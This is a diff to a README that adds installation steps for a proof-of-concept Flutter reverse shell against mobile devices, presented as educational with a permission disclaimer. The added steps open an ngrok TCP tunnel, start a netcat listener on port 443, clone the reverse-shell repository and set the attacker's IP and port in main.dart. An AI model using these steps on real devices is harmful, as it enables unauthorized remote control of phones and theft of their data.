@@ -12,7 +12,23 @@ This post is for educational purposes only, aimed at raising awareness about mob
 
 Attention all resources shared here should only be used with proper permission. Do not use them for any harmful or illegal activities. Stay responsible. Great Power Comes Great Responsibility.
 
-# Installation
+# Installation 
+setup ngrok
+- ./ngrok authtoken <your_auth_token>
+- ./ngrok tcp 443 
+- dig 2.tcp.ngrok.io (check ip address ngrok)
+*take note of ngrok port and ip address:
+
+setup listener
+- nc -lvnp 443
+
+clone repo
+- git clone https://github.com/NormanSamsudin/poc-flutter-reverse-shell.git
+ 
+configure reverse shell
+- change ip address and port on file main.dart
+
+
 
 
 
